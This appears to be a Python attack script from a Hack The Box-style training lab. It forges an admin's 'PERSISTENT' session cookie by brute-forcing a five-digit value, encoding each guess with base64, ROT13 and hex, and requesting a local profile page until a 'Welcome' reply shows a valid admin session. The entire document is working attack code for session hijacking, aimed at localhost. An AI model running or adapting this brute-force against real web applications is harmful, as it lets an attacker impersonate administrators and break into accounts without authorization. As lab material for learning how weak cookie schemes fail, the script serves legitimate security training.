from base64 import b64encode
from binascii import hexlify
import codecs
import requests
from sys import exit

# create url using user and password as argument
url = "http://127.0.0.1/profile.php"

# assume cookie is set as
# PERSISTENT=6e554576714b41797077636a4d4b576d6e4b41304d4a35304c3239696e3279794277526d5a777433
# and decoded gives htbuser:persistentcookie:13287

# bruteforce the 5digit scope
for x in range(100000):

    # force the string to be 5 chars, even if it is smaller than 10000
    x = str(x).zfill(5)

    print ("[+] Testing {}\r".format(x))
    plaintext_cookie = "htbadmin:persistentcookie:{}".format(x)

    # step 1: to Base64
    x_step1 = b64encode(plaintext_cookie.encode()).decode()
    #print(x_step1)

    # step 2: rot13
    x_step2 = codecs.encode(x_step1, "rot-13").encode()
    #print(x_step2)

    # step 3: to hex
    encoded_cookie = hexlify(x_step2)
    #print(encoded_cookie)

    # set cookie, decoding because wants a string
    cookie = { "PERSISTENT": encoded_cookie.decode() }

    # do the request
    res = requests.get(url, cookies=cookie)

    # handle Welcome message, that should tell us we found a valid cookie
    if 'Welcome ' in res.text:
        print("[+] Valid cookie found: {}".format(encoded_cookie))
        # we don't need more check
        exit()
    # if we are prompted a login page, we probably don't have a valid cookie
    elif 'Login ' in res.text:
        continue
    # we should never be here, notify in case
    else:
        print("[-] Unexpected reply, please manually check cookie {}".format(encoded_cookie))
